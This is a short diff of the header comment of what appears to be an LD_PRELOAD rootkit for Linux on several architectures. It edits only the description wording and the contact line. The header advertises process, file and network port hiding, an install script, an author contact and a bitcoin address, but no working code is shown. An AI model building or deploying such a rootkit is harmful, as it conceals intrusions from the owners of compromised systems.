@@ -7,7 +7,7 @@
  *     ╚████╔╝ ███████╗██║  ██║██║ ╚████║   ██║   
  *      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   
  *                                           
- *  LD_PRELOAD based rootkit for x86_64, i686 and ARM architectures
+ *  LD_PRELOAD rootkit for x86_64, i686 and ARM architectures
  *  complete with gid based process hiding,
  *                xattr based file hiding,
  *                network port hiding,
@@ -19,7 +19,7 @@
  *                easy-to-use installation script,
  *                incredibly robust configuration
  *                     
- *  contact: mem@xmpp.is
+ *  contact: mem@xmpp.is, @mempodippy
  *  btc addr: 1FfLiA4P5KHzKUHgCnMCVguJUgYJ8edW4B
  *
  *  credits:
